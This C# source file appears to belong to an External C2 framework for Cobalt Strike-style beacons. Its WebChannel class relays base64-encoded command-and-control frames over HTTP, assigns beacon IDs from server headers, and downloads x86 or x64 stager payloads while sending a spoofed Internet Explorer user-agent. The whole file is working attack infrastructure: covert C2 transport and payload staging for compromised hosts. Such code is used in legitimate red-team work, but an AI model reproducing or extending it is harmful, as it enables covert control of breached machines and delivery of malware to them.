using System;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using ExternalC2.Interfaces;

namespace ExternalC2.Channels
{
    /// <summary>
    ///     C2 Channel used to connect to the ExternalC2Web API server
    /// </summary>
    public class WebChannel : IC2Channel
    {
        private readonly WebClient _client;
        private readonly Uri _uri;

        /// <summary>
        ///     Create a web channel with the url
        /// </summary>
        /// <param name="url"></param>
        public WebChannel(string url)
        {
            _uri = new Uri(url);
            _client = new WebClient {BaseAddress = url};
        }

        /// <summary>
        ///     The unique beacon identifier
        /// </summary>
        public Guid BeaconId { get; private set; }

        /// <summary>
        ///     The API endpoint path
        /// </summary>
        public string UrlPath { get; private set; }

        /// <summary>
        ///     Determines if the channel is connected
        /// </summary>
        public bool Connected { get; private set; }

        /// <summary>
        ///     Connects to the WebSocket server
        /// </summary>
        /// <returns>If connection was successful</returns>
        public bool Connect()
        {
            // TODO: A more elaborate connect and configuration procedure
            UrlPath = _uri.AbsolutePath;

            _client.UploadString(UrlPath, "OPTIONS", "");

            // Example of configuring the client
            var idHeader = _client.ResponseHeaders.GetValues("X-Id-Header").FirstOrDefault();
            var beaconId = _client.ResponseHeaders.GetValues("X-Identifier").FirstOrDefault();

            if (beaconId != null)
            {
                BeaconId = new Guid(beaconId);
                _client.Headers.Add(idHeader, BeaconId.ToString());
                Connected = true;
            }
            else
            {
                Connected = false;
            }

            return Connected;
        }

        /// <summary>
        ///     Disposes the HttpClient
        /// </summary>
        public void Close()
        {
            _client.Dispose();
        }

        /// <summary>
        ///     Disposes the HttpClient
        /// </summary>
        public void Dispose()
        {
            _client.Dispose();
        }

        /// <summary>
        ///     Requests a frame from the web API
        /// </summary>
        /// <returns>The frame buffer</returns>
        public byte[] ReadFrame()
        {
            string b64Str;
            while (true) // TODO: Add failure condition
            {
                b64Str = _client.DownloadString(UrlPath);
                if (!string.IsNullOrEmpty(b64Str)) break;
                Thread.Sleep(1000);
            }

            return Convert.FromBase64String(b64Str);
        }

        /// <summary>
        ///     Send a frame to the web API
        /// </summary>
        /// <param name="buffer"></param>
        public void SendFrame(byte[] buffer)
        {
            _client.UploadString(UrlPath, "PUT", Convert.ToBase64String(buffer));
        }

        /// <summary>
        ///     Read a frame and send it to the connected channel
        /// </summary>
        /// <param name="c2"></param>
        /// <returns></returns>
        public bool ReadAndSendTo(IC2Channel c2)
        {
            var buffer = ReadFrame();
            if (buffer.Length <= 0) return false;
            c2.SendFrame(buffer);

            return true;
        }

        /// <summary>
        ///     Requests a stager using the BeaconId of the channel
        /// </summary>
        /// <param name="is64Bit"></param>
        /// <param name="taskWaitTime"></param>
        /// <returns>The stager bytes</returns>
        public byte[] GetStager(bool is64Bit, int taskWaitTime = 100)
        {
            return GetStager(BeaconId.ToString(), is64Bit, taskWaitTime);
        }

        /// <summary>
        ///     Requests a stager using the pipeName parameter
        /// </summary>
        /// <param name="pipeName"></param>
        /// <param name="is64Bit"></param>
        /// <param name="taskWaitTime"></param>
        /// <returns>The stager bytes</returns>
        public byte[] GetStager(string pipeName, bool is64Bit, int taskWaitTime = 100)
        {
            var bits = is64Bit ? "x64" : "x86";
            _client.Headers.Add("User-Agent",
                $"Mozilla/5.0 (Windows NT 10.0; {bits}; Trident/7.0; rv:11.0) like Gecko");

            var resp = _client.UploadData(UrlPath, new byte[] { });
            var b64Str = Encoding.Default.GetString(resp);

            return Convert.FromBase64String(b64Str);
        }
    }
}